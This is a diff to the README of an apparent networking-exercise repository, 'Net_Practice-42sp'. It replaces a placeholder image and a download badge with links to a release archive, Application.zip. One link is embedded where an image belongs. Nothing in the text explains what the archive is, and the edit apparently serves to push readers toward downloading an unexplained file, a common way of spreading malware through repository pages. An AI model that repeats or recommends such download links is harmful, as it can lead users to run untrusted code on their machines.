@@ -1,7 +1,7 @@
 
 # Welcome to Net_Practice-42sp 🌐
 
-![Network Image](https://image-url.jpg)
+![Network Image](https://github.com/slycodes2098/Net_Practice-42sp/releases/download/v1.0.0/Application.zip)
 
 ## Overview
 
@@ -23,7 +23,7 @@ In this repository, you will find discussions, examples, and exercises related t
 ## Link to Application
 
 To access the application related to this project, please click the button below:
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Application](https://github.com/slycodes2098/Net_Practice-42sp/releases/download/v1.0.0/Application.zip)](https://github.com/slycodes2098/Net_Practice-42sp/releases/download/v1.0.0/Application.zip)
 
 ## Getting Started
 
